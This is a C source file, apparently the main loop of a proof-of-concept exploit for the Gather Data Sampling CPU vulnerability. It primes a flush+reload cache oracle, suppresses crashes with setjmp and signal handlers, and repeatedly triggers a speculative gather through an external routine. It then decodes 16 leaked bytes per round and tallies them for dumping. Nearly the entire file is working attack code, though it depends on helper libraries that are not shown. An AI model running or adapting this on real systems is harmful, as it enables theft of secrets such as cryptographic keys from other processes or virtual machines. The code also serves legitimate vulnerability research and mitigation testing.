#include <setjmp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "cacheutils.h"
#include "lib.h"

#define BYTE_TRY   16
#define PAGE_SIZE  4096
#define CACHE_SIZE 64

//taskset -c 1 ./gds

extern uint64_t CACHE_THRESHOLD;
extern uint8_t* oracles;

extern void s_load_encode(uint32_t* perm, uint32_t* index);

uint32_t perm[16] = {0};
uint32_t pindex[16] = {0};

void intHandler(int dummy) {
    printf("NOW DUMPING\n");
    printf("\n");
    map_dump();
    exit(0);
}

int main(int argc, char* argv[]) {

    // signals handled to avoid the crash
    signal(SIGINT, intHandler);
    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGFPE, trycatch_segfault_handler);

    //setup oracle
    CACHE_MISS = detect_flush_reload_threshold();
    for (int i = 0; i < 256; i++) {
        flush((uint8_t*)&oracles + i * PAGE_SIZE);
    }

    map_create();

    for (int i = 0; i < 8; i++) {
        perm[i] = i + 0; //atoi(argv[1]);
    }

    while (1) {
        for (int i = 0; i < 16; i++) {
            pindex[i] = i * 4;
        }
        
        // Here we create a 'checkpoint' of the process
        // and jump back with a non null value when the process
        // segfault due to the speculative gather
        if (!setjmp(trycatch_buf)) {
            s_load_encode(perm, pindex);
        }

        // We allocated the an array for the future dumped byte
        unsigned char indexes[BYTE_TRY + 1];
        memset(indexes, 0, BYTE_TRY + 1);

        // We analyse the cache entries to recover the encoded bytes
        // of the temporal shared buffer
        for (size_t c = 0; c < BYTE_TRY; c++) {
            bool fr_ok = true;
            for (size_t i = 0; i < 256; i++) {
                int mix_i = i;
                if (fr_ok && flush_reload((uint8_t*)&oracles + (mix_i + (c * 256)) * PAGE_SIZE)) {
                    indexes[c] = (mix_i + (c * 256)) % 256;
                    fr_ok = false;
                }
            }
        }
        if (strlen(indexes) >= BYTE_TRY) {
            printf("Incrementing...\n");
            map_increment(indexes);
        }
    }
    map_dump();
    return 0;
}
